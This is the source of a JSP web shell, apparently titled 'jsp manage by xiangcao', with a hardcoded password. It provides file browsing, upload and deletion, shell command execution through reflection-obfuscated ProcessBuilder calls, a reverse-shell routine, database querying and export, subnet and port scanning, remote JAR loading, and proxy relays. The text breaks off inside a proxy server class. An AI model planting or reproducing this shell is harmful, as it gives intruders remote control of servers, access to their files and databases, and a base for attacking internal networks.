<%@page import="java.security.cert.CertificateException,java.security.cert.X509Certificate,javax.net.ssl.SSLContext,javax.net.ssl.SSLSocketFactory,javax.net.ssl.TrustManager,javax.net.ssl.X509TrustManager"%>
<%@ page language="java" contentType="text/html; charset=utf-8"
        pageEncoding="utf-8"%>
<%@ page import="java.io.*,java.util.*,java.net.*,java.util.concurrent.*,java.util.zip.*,java.lang.reflect.*,java.sql.*,java.text.*" %>
<%
String pass_word = "next@2019";

%>
<%=request.getSession().getServletContext().getResource("/").getPath()+request.getServletPath()+"xxxx"%>
<%if(getParam(request, "module").equals("proxy")&&getParam(request, "action").equals("back_proxy")){
        String p_host=getParam(request, "host");
        int p_port=Integer.parseInt(getParam(request,"port"));
        String value=getParam(request, "value");
        if(value.indexOf("\r\n\r\n")==-1){
                value+="\r\n\r\n";
        }
        ProxyModel model = new ProxyModel();
        model.host=p_host;
        model.port=p_port;
        System.out.println(p_host+"  "+p_port);
        Socket client=null;
        if(p_port==443){//ssl
                
            //  TrustManager mytm[] = { new TrustManager() };
         
             // SSLContext ctx = SSLContext.getInstance("SSL");  
            //  ctx.init(null, mytm, null);  
                // 
            //  SSLSocketFactory factory = ctx.getSocketFactory();
            //  client = factory.createSocket(p_host, 443);
                
        }else{
                client = new Socket(p_host,p_port);
        }
        
        BackProxy proxy = new BackProxy(model);
        proxy.write(client.getOutputStream(),value);
        
        proxy.readAndResponse(client.getInputStream(), response.getOutputStream());
        
        response.flushBuffer();
        out.clear();  
        out = pageContext.pushBody();
        client.close();
}else{%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>jsp manage by xiangcao</title>
<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
<style type="text/css">  
table {  
                border: 1px solid #B1CDE3;  
                padding:0;   
             /* margin:0 auto;*/  
                border-collapse: collapse;  
        }  
            
        td {  
                border: 1px solid #B1CDE3;  
             /* background: #fff;*/  
                font-size:12px;  
                padding: 3px 3px 3px 8px;  
                /*color: #4f6b72;*/ 
                background-color:black;
                color:white; 
        } 
     #pan span{
             margin-left:20px;
             }
             a:link{
text-decoration:none;
}
a:visited{
text-decoration:none;
}
a:hover{
text-decoration:none;
}
a:active{
text-decoration:none;
}
form input{
background-color:black;
color:white;
}
#file{
float: left;
}
#result,#shell{
background-color:black;
color:white;
overflow-x:auto;
}
#shell{
        min-width:1024px;
        width:900px;
        overflow-x:auto;
}
#result{
        min-height:400px;
        min-width:1024px;
        width:900px;
        overflow-x:auto;
}
#result_sql,#file_content{
min-height:400px;
background-color:black;
color:white;
overflow-x:auto;
}
#shell_sql{
min-width:1024px;
min-height:400px;
background-color:black;
color:white;
overflow-x:auto;
}
#file_content{
min-width:1024px;
width:900px;
overflow-x:auto;
}
.hiddent_tr{
        display:none;
}
</style>
</head>
<body>
<%!
public List<FileModel> listFile(String path)throws Exception{
        List<String> files = new ArrayList<String>();
        List<FileModel> models=new ArrayList<FileModel>();
        File f = new File(path);
        if(f.exists()){
                File[] fs = f.listFiles();
                for(File item:fs){
                        files.add(item.getName()+"|||"+item.getPath()+"|||"+item.isFile());
                        FileModel model=new FileModel();
                        model.file=item;
                        model.name=item.getName();
                        model.path=item.getPath();
                        model.is_file=item.isFile();
                        String size=Float.toString(model.getFileSize(item.getPath()));
                        model.size=size.equals("0.0")?"--":size;
                        model.can_exec=true;//
                        model.can_read=item.canRead();
                        model.can_write=item.canWrite();
                        java.util.Date d=new java.util.Date(item.lastModified());
                        java.text.SimpleDateFormat df=new java.text.SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                        model.last_mod=df.format(d);
                        models.add(model);
                }
        }
        return models;
}
public class FileModel{
        public String name;
        public String path;
        public String size;
        public String last_mod;
        public File file;
        public boolean can_read;
        public boolean can_write;
        public boolean can_exec;
        public boolean is_file;
        public float getFileSize(String path){
                File f = new File(path);
                float size = 0f;
                if(f.isFile()){
                        size += f.length()/1024.0f;
                }else{
                }
                return size;
        }
}
public void delete(String path){
        File f = new File(path);
        if(f.isFile()){
                f.delete();
        }else if(f.isDirectory()){
                deleteDirectory(path);
        }
}
public void copyFile(String oldPath, String newPath) { 
        try { 
                int bytesum = 0; 
                int byteread = 0; 
                File oldfile = new File(oldPath); 
                if (oldfile.exists()) { 
                        InputStream inStream = new FileInputStream(oldPath);
                        File mf=new File(newPath);
                        mf = new File(mf.getParent());
                        if(!mf.exists()){
                        	mf.mkdir();
                        }
                        FileOutputStream fs = new FileOutputStream(newPath); 
                        
                        byte[] buffer = new byte[1444]; 
                        int length; 
                        while ( (byteread = inStream.read(buffer)) != -1) { 
                                bytesum += byteread;
                                fs.write(buffer, 0, byteread); 
                        } 
                        inStream.close(); 
                } 
        } 
        catch (Exception e) { 
                System.out.println("error "+e); 

        } 

} 
public File doZip(String sourceDir, String zipFilePath) throws IOException {
        File file = new File(sourceDir);
        File zipFile = new File(zipFilePath);
        ZipOutputStream zos = null;
        try {
                OutputStream os = new FileOutputStream(zipFile);
                BufferedOutputStream bos = new BufferedOutputStream(os);
                zos = new ZipOutputStream(bos);
                String basePath = null;
                if (file.isDirectory()) {
                        basePath = file.getPath();
                } else {
                        basePath = file.getParent();
                }
                zipFile(file, basePath, zos);
        } finally {
                if (zos != null) {
                        zos.closeEntry();
                        zos.close();
                }
        }

        return zipFile;
}
private void zipFile(File source, String basePath, ZipOutputStream zos)
                throws IOException {
        File[] files = null;
        if (source.isDirectory()) {
                files = source.listFiles();
        } else {
                files = new File[1];
                files[0] = source;
        }
        InputStream is = null;
        String pathName;
        byte[] buf = new byte[1024];
        int length = 0;
        try {
                for (File file : files) {
                        if (file.isDirectory()) {
                                pathName = file.getPath().substring(basePath.length() + 1)
                                                + "/";
                                zos.putNextEntry(new ZipEntry(pathName));
                                zipFile(file, basePath, zos);
                        } else {
                                pathName = file.getPath().substring(basePath.length() + 1);
                                is = new FileInputStream(file);
                                BufferedInputStream bis = new BufferedInputStream(is);
                                zos.putNextEntry(new ZipEntry(pathName));
                                while ((length = bis.read(buf)) > 0) {
                                        zos.write(buf, 0, length);
                                }
                                bis.close();
                        }
                }
        } finally {
                if (is != null) {
                        is.close();
                }
        }
}
public boolean upload(HttpServletRequest request,String path)throws Exception{
        UploadBean bean = new UploadBean();
        bean.setSavePath(path);
        bean.parseRequest(request);
        return true;
}
public boolean isEmpty(String s) {
        return s == null || s.trim().equals("");
}
public void sendRedirect(HttpServletResponse response,String url)throws Exception{
        response.sendRedirect(url);
}
public boolean deleteDirectory(String sPath) { 
        File tf = new File(sPath);
        if(!tf.exists()){
                return true;
        }
        if(tf.isDirectory()){
                File fs[] = tf.listFiles();
                for(File item:fs){
                        deleteDirectory(item.getPath());
                }
        }else{
                tf.delete();
        }
        tf.delete();
     return true;
}
public String getParam(HttpServletRequest request,String name){
        String value=request.getParameter(name);
        return value==null?"":value.trim();
}
public String getSession(HttpSession session,String name){
        Object o=session.getAttribute(name);
        if(o!=null){
                return o.toString();
        }
        return "";
}
public boolean rename(String path,String target){
        File f = new File(path);
        if(f.exists()&&(f.isFile()||f.isDirectory())){
                return f.renameTo(new File(target));
        }
        return false;
}
public String getSystemProperty(String name){
        return System.getProperty(name);
}
public String getIpAddress() throws UnknownHostException {  
        InetAddress address = InetAddress.getLocalHost();  
        return address.getHostAddress();  
}
private static class FileManage{
         String host = "";
         public String curl(String url)throws Exception{
                	String ret = "";
                	URL u = new URL(url);
                	URLConnection uc = u.openConnection(); 
                	host=u.getHost();
                	Scanner sn=new Scanner(uc.getInputStream());
                	 while(sn.hasNextLine()){
                		 ret+=sn.nextLine();
                	 }
                	 sn.close();
                	return ret;
         }
         private String getRelName(String name){
                 int i=name.lastIndexOf(".");
                 if(i==-1){
                         return name;
                 }else{
                         return name.substring(0,i);
                 }
         }
         private String getExtion(String name){
                 int i=name.lastIndexOf(".");
                 if(i==-1){
                         return "";
                 }else{
                         return name.substring(i+1);
                 }
         }
         private String createFileName(String path,String fname){
                 File ftemp=new File(path+"/"+fname);
                 if(ftemp.exists()){
                 	fname=getRelName(fname)+"("+UUID.randomUUID().toString()+")."+getExtion(fname);
                 }
                 return fname;
         }
         public boolean writeContent(String path,String fname,String content,boolean ap)throws Exception{
                        BufferedWriter writer = null;boolean issec = false;
                        try{
                                File p=new File(path);
                                if(!p.exists()){
                                        p.mkdirs();
                                }
                                if(!ap){
                                        fname=createFileName(path,fname);
                                }
                                writer = new BufferedWriter(new FileWriter(new File(path+"/"+fname),ap));
                                writer.append(content);
                                writer.flush();
                                issec = true;
                        }catch(Exception e){
                                issec = false;
                                throw e;
                        }finally{
                                writer.close();
                        }
                        return issec;
            }
         public String getContent(String path)throws Exception{
         	String data = "";
         	BufferedReader reader = null;
         	try{
         		if(isUTF8(path)){
         			System.out.println("utf-8");
                 		reader = new BufferedReader(new InputStreamReader(new FileInputStream(path),"UTF-8"));
         		}else{
                 		reader = new BufferedReader(new InputStreamReader(new FileInputStream(path),"GBK"));
         		}
         		String it = "";
         		while((it=reader.readLine())!=null){
         			data+=it+"\n";
         		}
         		reader.close();
         	}catch(Exception e){
         		throw e;
         	}
         	return data;
         }
         public boolean isUTF8(String path){
                 File file = new File(path);
                 boolean isutf8 = false;
                 try{
                         InputStream in= new FileInputStream(file);
                         byte[] b = new byte[3];
                         in.read(b);
                         in.close();
                         if (b[0] == -17 && b[1] == -69 && b[2] == -65){ 
                                isutf8 = true;
                         }else{
                                 isutf8 = false;
                         }
                 }catch(Exception e){
                         
                 }
                 return isutf8;
         }
         public void createFile(String url,String path,String fname,boolean ap)throws Exception{
                 try{
                         String data = curl(url);
                         if(fname.equals("")){
                                 fname=host;
                         }
                         writeContent(path,fname, data, ap);
                 }catch(Exception e){
                         throw e;
                 }
         }
}
private static class UploadBean {
        private String fileName = null;
        private String suffix = null;
        private String savePath = "";
        private ServletInputStream sis = null;
        private byte[] b = new byte[1024];

        public UploadBean() {
        }

        public void setSavePath(String path) {
                        this.savePath = path;
        }

        public void parseRequest(HttpServletRequest request) throws IOException {
                        sis = request.getInputStream();
                        int a = 0;
                        int k = 0;
                        String s = "";
                        while ((a = sis.readLine(b, 0, b.length)) != -1) {
                                        s = new String(b, 0, a, "utf-8");
                                        if ((k = s.indexOf("filename=\"")) != -1) {
                                                        s = s.substring(k + 10);
                                                        k = s.indexOf("\"");
                                                        s = s.substring(0, k);
                                                        File tF = new File(s);
                                                        if (tF.isAbsolute()) {
                                                                        fileName = tF.getName();
                                                        } else {
                                                                        fileName = s;
                                                        }
                                                        k = s.lastIndexOf(".");
                                                        suffix = s.substring(k + 1);
                                                        upload();
                                        }
                        }
        }
        private void upload()throws IOException{
                        try {
                                        FileOutputStream out = new FileOutputStream(new File(savePath,
                                                                        fileName));
                                        int a = 0;
                                        int k = 0;
                                        String s = "";
                                        while ((a = sis.readLine(b, 0, b.length)) != -1) {
                                                        s = new String(b, 0, a);
                                                        if ((k = s.indexOf("Content-Type:")) != -1) {
                                                                        break;
                                                        }
                                        }
                                        sis.readLine(b, 0, b.length);
                                        while ((a = sis.readLine(b, 0, b.length)) != -1) {
                                                        s = new String(b, 0, a);
                                                        if ((b[0] == 45) && (b[1] == 45) && (b[2] == 45)
                                                                                        && (b[3] == 45) && (b[4] == 45)) {
                                                                        break;
                                                        }
                                                        out.write(b, 0, a);
                                        }
                                        out.close();
                        } catch (IOException ioe) {
                                        ioe.printStackTrace();
                                        throw ioe;
                        }
        }
}

public class Cmd{
        public List<String> exec(String pro,String cmd){
                List<String> result = new ArrayList<String>();
                Scanner sInput =null;
                Scanner sError =null;
                try{
                        Object obj=Class.forName("java.lang.Proce\u0073sBuilder").getDeclaredConstructor(String[].class).newInstance(new Object[]{new String[]{pro,cmd}});
                        Method start=obj.getClass().getDeclaredMethod("\u0073tart");
                        Object oo=start.invoke(obj);
                        Method mInput=oo.getClass().getDeclaredMethod("getInputStream");
                        Method mError=oo.getClass().getDeclaredMethod("getErrorStream");
                        mInput.setAccessible(true);
                        mError.setAccessible(true);
                        sInput = new Scanner((InputStream)(mInput.invoke(oo)));
                        sError = new Scanner((InputStream)(mError.invoke(oo)));
                        result.add("<pre>");
                        while(sInput.hasNextLine()){
                                result.add(sInput.nextLine().trim());
                        }
                        while(sError.hasNextLine()){
                                result.add(sInput.nextLine().trim());
                        }
                }catch(Exception e){
                        result.add(e.getMessage());
                }finally{
                        sInput.close();
                        sError.close();
                        result.add("</pre>");
                }
                return result;
        }
        public Object getProcess(String pro,String arg)throws Exception{
                Object obj=Class.forName("java.lang.Proce\u0073sBuilder").getDeclaredConstructor(String[].class).newInstance(new Object[]{new String[]{pro,arg}});
                Method start=obj.getClass().getDeclaredMethod("\u0073tart");
                Object oo=start.invoke(obj);
                return oo;
        }
        public InputStream getInputStream(Object oo)throws Exception{
                Method mInput=oo.getClass().getDeclaredMethod("getInputStream");
                mInput.setAccessible(true);
                return (InputStream)(mInput.invoke(oo));
        }
        public InputStream getErrorStream(Object oo)throws Exception{
                Method mError=oo.getClass().getDeclaredMethod("getErrorStream");
                mError.setAccessible(true);
                return (InputStream)(mError.invoke(oo));
        }
        public OutputStream getOutputStream(Object oo)throws Exception{
                Method mError=oo.getClass().getDeclaredMethod("getOutputStream");
                mError.setAccessible(true);
                return (OutputStream)(mError.invoke(oo));
        }
        public void backShell(String ip,int port,String pro,String arg)throws Exception{
                Socket socket = null;
                try{
                        socket = new Socket(ip, port);
                        Object oo = getProcess(pro, arg);
                        (new StreamConnector(getInputStream(oo), socket
                                        .getOutputStream())).start();
                        (new StreamConnector(getErrorStream(oo), socket
                                        .getOutputStream())).start();
                        (new StreamConnector(socket.getInputStream(), getOutputStream(oo))).start();
                }catch(Exception e){
                        throw e;
                }finally{
                }
        }
}
public class SqlManager{
        public String driver="com.mysql.jdbc.Driver";
        public String url="jdbc:mysql://127.0.0.1:3306/";
        public String username="root";
        public String password="";
        public Connection conn =null;
        public String schema="";
        Statement statement = null;
        DatabaseMetaData dbmd = null;
        private SqlManager smanager=null;
        public SqlManager(HttpSession session){
                this.driver = getSession(session,"sql_driver");
                this.url=getSession(session,"sql_url");
                this.username=getSession(session,"sql_name");
                this.password=getSession(session,"sql_password");
                this.schema=getSession(session,"sql_schema");
        }
        public Connection getConnection()throws Exception{
                try{
                        Class.forName(driver);
                        conn = DriverManager.getConnection(url, username, password);
                        if(!schema.equals("")){
                                setSchema(conn,schema);
                        }
                }catch(Exception e){
                        throw e;
                }finally{
                }
                return conn;
        }
        public void setSchema(Connection conn,String name)throws Exception{
                if(conn!=null){
                        conn.setCatalog(name);
                }
        }
        public void export(HttpServletRequest request, HttpServletResponse response,HttpSession session,String sql)throws Exception{
                ByteArrayOutputStream bout = new ByteArrayOutputStream();
                ByteArrayInputStream input = null;
                OutputStream os=response.getOutputStream();
                try{
                        String encode = request.getParameter("encode");
                        DataModel model=query(sql);
                        
                        byte[] sep = "\r\n".getBytes();
                        for(String s:model.column){
                                s+="\t";
                                if(isEmpty(encode)){
                                        bout.write(s.getBytes());
                                }else{
                                        bout.write(s.getBytes(encode));
                                }
                        }
                        bout.write(sep);
                        for(Map<String,String> data:model.datas){
                                for(String colName:model.column){
                                        String dtemp=data.get(colName)+"\t";
                                        if(isEmpty(encode)){
                                                bout.write(dtemp.getBytes());
                                        }else{
                                                bout.write(dtemp.getBytes(encode));
                                        }
                                }
                                bout.write(sep);
                        }
                        bout.write(sep);
                        input = new ByteArrayInputStream(bout.toByteArray());
                        
                        response.setContentType("application/x-download");
                        response.addHeader("Content-Disposition","attachment;filename=export.txt");
                        BufferedInputStream bis = new BufferedInputStream(input);
                	 byte[] b = new byte[1024];
                         int i = 0;
                         while((i = bis.read(b)) > 0)
                         {
                        	  os.write(b, 0, i);
                         }
                         bout.close();
                         input.close();
                         os.flush();
                }catch(Exception e){
                        throw e;
                }finally{
                        if(bout!=null){
                                bout.close();
                        }
                        if(input!=null){
                                bout.close();
                        }
                        os.close();
                }
        }
        public DatabaseInfo getDatabseinfo(String schema)throws Exception{
                dbmd = conn.getMetaData();
                DatabaseInfo info = new DatabaseInfo();
                try{
                        info.varsion=dbmd.getDatabaseProductVersion();
                        ResultSet rs=null;
                        if(info.varsion.indexOf("Oracle Database")>-1){
                        	rs = dbmd.getSchemas();
                        }else{
                        	rs = dbmd.getCatalogs();
                        }
                        while(rs.next()){
                                System.out.println(rs.getString(1)+"====");
                                info.databases.add(rs.getString(1));
                        }
                        
                        info.build_path=dbmd.getURL();
                        ResultSet rst = null;
                        if(schema==null||schema.equals("")) schema=info.databases.get(0);
                        System.out.println("schema:"+schema);
                        if(info.varsion.indexOf("Oracle Database")>-1){
                                rst = dbmd.getTables(null, schema, null, null);
                        }else{
                                rst = dbmd.getTables(schema, null, null, null);
                        }
                        int index = 0;
                        while(rst.next()){
                                Table tb=new Table();
                                String TABLE_NAME = rst.getString("TABLE_NAME");
                                String TABLE_TYPE = rst.getString("TABLE_TYPE");
                                String TABLE_CAT = rst.getString("TABLE_CAT");
                                String TABLE_SCHEM = rst.getString("TABLE_SCHEM");
                                String REMARKS = rst.getString("REMARKS");
                                tb.TABLE_NAME=TABLE_NAME;
                                tb.TABLE_CAT=TABLE_CAT;
                                tb.TABLE_SCHEM=TABLE_SCHEM;
                                tb.TABLE_TYPE=TABLE_TYPE;
                                tb.REMARKS=REMARKS;
                                ResultSet rscul = dbmd.getColumns(null, null, TABLE_NAME,null);
                                while(rscul.next()){
                                        Column col=new Column();
                                        col.COLUMN_NAME=rscul.getString("COLUMN_NAME");
                                        col.COLUMN_SIZE=rscul.getInt("COLUMN_SIZE");
                                        col.TYPE_NAME=rscul.getString("TYPE_NAME");
                                        col.REMARKS=rscul.getString("REMARKS");
                                        tb.columns.add(col);
                                }
                                info.tables.add(tb);
                                
                        }
                        
                }catch(Exception e){
                        throw e;
                }
                return info;
        }
 	public DataModel execute(String sql)throws Exception{
 		DataModel model = new DataModel();
 		statement = conn.createStatement();
 		int i=statement.executeUpdate(sql);
 		model.column.add("execute");
 		Map<String,String> mm = new HashMap<String,String>();
 		mm.put("execute", "Affected rows:"+i);
 		model.datas.add(mm);
 		return model;
 	}
        public DataModel query(String sql)throws Exception{
                DataModel model = new DataModel();
                statement=conn.createStatement();
                ResultSet rst = statement.executeQuery(sql);
                ResultSetMetaData mt = rst.getMetaData();
                int index = 0;
                int colum_num = mt.getColumnCount();
                Map<String,String> mm = new HashMap<String,String>();
                for(int i=1;i<=colum_num;i++){
                        String name=mt.getColumnLabel(i);
                        model.column.add(name);
                }
                while(rst.next()){
                        int i=1;
                        Map<String,String> m=new HashMap<String,String>();
                        for(;i<=colum_num;i++){
                                String name=mt.getColumnLabel(i);
                                Object data=rst.getObject(name);
                                if(data==null){
                                        data="";
                                }
                                m.put(name, data.toString());
                        }
                        model.datas.add(m);
                }
                return model;
        }
        public void close()throws Exception{
                if(conn!=null){
                        conn.close();
                }
        }
        public class DatabaseInfo{
                public String varsion;
                public String build_path;
                public List<String> databases=new ArrayList<String>();
                public List<Table> tables=new ArrayList<Table>();
        }
        public class Column{
                public String COLUMN_NAME;
                public String TYPE_NAME;
                public int COLUMN_SIZE;
                public String REMARKS;
        }
        public class Table{
                public String TABLE_NAME;
                public String TABLE_TYPE;
                public String TABLE_CAT;
                public String TABLE_SCHEM;
                public String REMARKS;
                public List<Column> columns = new ArrayList<Column>();
        }
        public class DataModel{
                public List<String> column=new ArrayList<String>();
                public List<Map<String,String>> datas = new ArrayList<Map<String,String>>();
        }
}
private static class StreamConnector extends Thread {
        private InputStream is;
        private OutputStream os;

        public StreamConnector(InputStream is, OutputStream os) {
                this.is = is;
                this.os = os;
        }

        public void run() {
                BufferedReader in = null;
                BufferedWriter out = null;
                try {
                        in = new BufferedReader(new InputStreamReader(this.is));
                        out = new BufferedWriter(new OutputStreamWriter(this.os));
                        char buffer[] = new char[8192];
                        int length;
                        while ((length = in.read(buffer, 0, buffer.length)) > 0) {
                                out.write(buffer, 0, length);
                                out.flush();
                        }
                } catch (Exception e) {
                }
                try {
                        if (in != null)
                                in.close();
                        if (out != null)
                                out.close();
                } catch (Exception e) {
                }
        }

        public static void readFromLocal(final DataInputStream localIn,
                        final DataOutputStream remoteOut) {
                new Thread(new Runnable() {
                        public void run() {
                                while (true) {
                                        try {
                                                byte[] data = new byte[100];
                                                int len = localIn.read(data);
                                                while (len != -1) {
                                                        remoteOut.write(data, 0, len);
                                                        len = localIn.read(data);
                                                }
                                        } catch (Exception e) {
                                                break;
                                        }
                                }
                        }
                }).start();
        }

        public static void readFromRemote(final Socket soc,
                        final Socket remoteSoc, final DataInputStream remoteIn,
                        final DataOutputStream localOut) {
                new Thread(new Runnable() {
                        public void run() {
                                while (true) {
                                        try {
                                                byte[] data = new byte[100];
                                                int len = remoteIn.read(data);
                                                while (len != -1) {
                                                        localOut.write(data, 0, len);
                                                        len = remoteIn.read(data);
                                                }
                                        } catch (Exception e) {
                                                try {
                                                        soc.close();
                                                        remoteSoc.close();
                                                } catch (Exception ex) {
                                                }
                                                break;
                                        }
                                }
                        }
                }).start();
        }
}
public interface Invoker{
        public void invoke(HttpServletRequest request,HttpServletResponse response, HttpSession JSession)throws Exception;
}
/**
*network scaner
*/
public class NetWorkScaner{
        
        public List<String> scan()throws InterruptedException{
                int threadNum=256;
                CountDownLatch threadSignal = new CountDownLatch(threadNum-1);
                List<String> hosts=new ArrayList<String>();
                String ip = getAddress().getHostAddress();
                ip=ip.substring(0, ip.lastIndexOf(".")+1);
        	for (int i = 1 ; i < threadNum; i++)
        	{
                	String host = ip+i;
                	ScanNet s = new ScanNet(hosts,threadSignal);
                	s.host=host;
                	s.start();
                }
        	threadSignal.await();
        	return hosts;
        }
        public List<Integer> portScan(HttpServletRequest request,
                        HttpServletResponse response, HttpSession session,String host,String port)throws Exception{
                List<Integer> ports=new ArrayList<Integer>();
                String _hosts[]=port.split(",");
                List<Integer> _ports = new ArrayList<Integer>();
                for(String s:_hosts){
                        String _h[]=s.split("-");
                        if(_h.length>1){
                                int start=Integer.parseInt(_h[0]);
                                int end=Integer.parseInt(_h[1]);
                                for(int i=start;i<=end;i++){
                                        _ports.add(i);
                                }
                        }else{
                                _ports.add(Integer.parseInt(s));
                        }
                        
                }
        
                ExecutorService pool = Executors.newFixedThreadPool(10);
                CountDownLatch threadSignal = new CountDownLatch(_ports.size());
                for(Integer i:_ports){
                        PortScan scan = new PortScan(ports,request,response,session,host,i);
                        scan.threadsSignal=threadSignal;
                        pool.execute(scan);
                }
                threadSignal.await();
                return ports;
        }
        /**
         * Get host IP address
         *
         * @return IP Address
         */
        public InetAddress getAddress() {
                try {
                        /*for (Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements();) {
                                NetworkInterface networkInterface = interfaces.nextElement();
                                if (networkInterface.isLoopback() || networkInterface.isVirtual() || !networkInterface.isUp()) {
                                        continue;
                                }
                                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                                if (addresses.hasMoreElements()) {
                                        return addresses.nextElement();
                                }
                        }*/
                        if(System.getProperty("os.name").toLowerCase().indexOf("window")>=0){
                        	return InetAddress.getLocalHost();
                        }else{
                        	GetIP ip = new GetIP();
                        	InetAddress myip = ip.getLocalIP();
                        	return myip!=null?myip:InetAddress.getLocalHost();
                        }
                } catch (Exception e) {
                	e.printStackTrace();
                }
                return null;
        }
        public class GetIP {
                
                public InetAddress getLocalIP() {
                	InetAddress ip = null;
                        try {
                                Enumeration<?> e1 = (Enumeration<?>) NetworkInterface
                                                .getNetworkInterfaces();
                                while (e1.hasMoreElements()) {
                                        NetworkInterface ni = (NetworkInterface) e1.nextElement();
                                        if (!ni.getName().equals("eth0")) {
                                                continue;
                                        } else {
                                                Enumeration<?> e2 = ni.getInetAddresses();
                                                while (e2.hasMoreElements()) {
                                                        InetAddress ia = (InetAddress) e2.nextElement();
                                                        if (ia instanceof Inet6Address)
                                                                continue;
                                                        ip = ia;
                                                }
                                                break;
                                        }
                                }
                        } catch (SocketException e) {
                                e.printStackTrace();
                                System.exit(-1);
                        }
                        return ip;
                }
                public String byteHEX(byte ib) {
                        char[] Digit = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a',
                                        'b', 'c', 'd', 'e', 'f' };
                        char[] ob = new char[2];
                        ob[0] = Digit[(ib >>> 4) & 0X0F];
                        ob[1] = Digit[ib & 0X0F];
                        String s = new String(ob);
                        return s;
                }
        }
        public class PortScan extends Thread  implements Invoker {
                List<Integer> ports;
                HttpServletRequest request;
                HttpServletResponse response;
                HttpSession JSession;
                CountDownLatch threadsSignal;
                String host;
                int port;
                public PortScan(List<Integer> ports,HttpServletRequest request,
                                HttpServletResponse response, HttpSession JSession,String host,int port){
                        this.request=request;
                        this.response=response;
                        this.JSession=JSession;
                        this.host=host;
                        this.port=port;
                        this.ports=ports;
                }
                public void invoke(HttpServletRequest request,
                                HttpServletResponse response, HttpSession JSession)throws Exception{
                        Socket s=new Socket();
                        try{
                                
                                s.connect(new InetSocketAddress(this.host,this.port), 10);
                                s.setSoTimeout(10);
                                s.close();
                                ports.add(this.port);
                        }catch(Exception e){
                                throw e;
                        }finally{
                                threadsSignal.countDown();
                                s.close();
                        }
                }
                public void run() {
                        try{
                                invoke(request,response,JSession);
                        }catch(Exception e){
                                System.out.println( this.port+" is close!");
                        }
                }
        }
        public class ScanNet extends Thread{
                private String host="";
                private boolean isAlive=false;
                private CountDownLatch threadsSignal;  
                List<String> hosts;
                public ScanNet(List<String> hosts,CountDownLatch threadSignal){
                        this.threadsSignal=threadSignal;
                        this.hosts=hosts;
                }
                
                public void run() {
                        try {
                                isAlive=isAlive(this.host);
                                if(isAlive){
                                        this.hosts.add(this.host);
                                }
                        } catch (Exception e) {
                                e.printStackTrace();
                        }finally{
                                threadsSignal.countDown();
                        }
                }
                public boolean isAlive(String ip) throws Exception{
                        InetAddress ia;
                        boolean bool=false;
                        try {
                                ia = InetAddress.getByName(ip);
                                bool = ia.isReachable(1500);
                        } catch (Exception e) {
                                e.printStackTrace();
                                throw e;
                        }
                        return bool;
                }
                
        }
}
public class ExecJar{
        
        public URL[] listJar(){
                return ((URLClassLoader) ClassLoader.getSystemClassLoader()).getURLs();
        }
        public void setClassLoader(HttpSession session,String paths){
                String p[]=paths.split(",");
                List<URL> urls=new ArrayList<URL>();
                for(String s:p){
                        s=s.trim();
                        if(s.startsWith("http://")){
                                try{
                                        urls.add(new URL(s));
                                }catch(Exception e){
                                        session.setAttribute("error", s+" "+e.getMessage()+"\n");
                                        e.printStackTrace();
                                }
                        }else{
                                s=s.substring(6);
                                File ff=new File(s);
                                if(ff.exists()){
                                        if(ff.isFile()){
                                                try{
                                                        urls.add(ff.toURI().toURL());
                                                }catch(Exception e){
                                                        session.setAttribute("error", s+" "+e.getMessage()+"\n");
                                                }
                                        }else if(ff.isDirectory()){
                                                File fs[]=ff.listFiles();
                                                for(File item:fs){
                                                        try{
                                                                urls.add(item.toURI().toURL());
                                                        }catch(Exception e){
                                                                session.setAttribute("error", s+" "+e.getMessage()+"\n");
                                                        }
                                                }
                                        }
                                }
                        }
                }
                session.setAttribute("my_class_loader",initClassLoader(urls));
        }
        public Object eval(MyClassLoader myclass,String class_path,String method,String []param)throws Exception{
                Object result=null;
                Object rType=null;
                if(myclass!=null){
                        try{
                                Object target=myclass.loadClass(class_path).newInstance();
                                Method mm = null;
                                if(param!=null&&param.length>0){
                                        mm = target.getClass().getMethod(method,String[].class);
                                        rType=mm.getReturnType();
                                        result=mm.invoke(target, (Object)param);
                                }else{
                                        mm = target.getClass().getMethod(method);
                                        rType=mm.getReturnType();
                                        result=mm.invoke(target);
                                }
                        }catch(Exception e){
                                throw e;
                        }
                }
                return result;
        }

        private MyClassLoader initClassLoader(List<URL> jars){
                URL[] urls = new URL[jars.size()];
                int index = 0;
                for(URL u:jars){
                        urls[index++]=u;
                }
                MyClassLoader loader=new MyClassLoader(urls);
                return loader;
        }
        public void loadJar(String jarPath)throws Exception{
                try{
                        Method mm = URLClassLoader.class.getDeclaredMethod("addURL", URL.class); 
                        mm.setAccessible(true);
                        jarPath=jarPath.trim();
                        if(jarPath.startsWith("file:/")){
                                String filepath=jarPath.substring(6);
                                File ff=new File(filepath);
                                System.out.println(ff.toURI().toURL());
                                if(!ff.exists()){
                                        throw new Exception("file not exists!");
                                }
                        }
                        URL url = new URL(jarPath);
                        URLClassLoader loader = (URLClassLoader) ClassLoader.getSystemClassLoader();
                        mm.invoke(loader, url);
                        //loader.close();
                }catch(Exception e){
                        e.printStackTrace();
                        throw e;
                }
        }
        public Object eval(String class_path,String method,String...param)throws Exception{
                Object result=null;
                Object rType=null;
                try{
                        Object o=Class.forName(class_path).newInstance();
                        Method mm = null;
                        if(param!=null&&param.length>0){
                                mm = o.getClass().getDeclaredMethod(method,String[].class);
                                rType=mm.getReturnType();
                                result=mm.invoke(o, param);
                        }else{
                                mm = o.getClass().getDeclaredMethod(method);
                                rType=mm.getReturnType();
                                result=mm.invoke(o);
                        }
                }catch(Exception e){
                        throw e;
                }
                
                return result;
        }
        
}
public class MyClassLoader extends URLClassLoader {
        public MyClassLoader(URL[] urls) {
                super(urls);
        }

        public MyClassLoader(URL[] urls, ClassLoader parent) {
                super(urls, parent);
        }

        public void addJar(URL url) {
                this.addURL(url);
        }

}

public class SubProxyServer extends Thread
{
        private Socket clientSocket;
        
        public SubProxyServer(Socket socket)
        {
                this.clientSocket=socket;
        }
        
        public void run()
        {
                
                try {
                        
                        byte[] buffer = new byte[1000000];
                        InputStream bis = clientSocket.getInputStream();
                        
                        // reading the request and put it into buffer
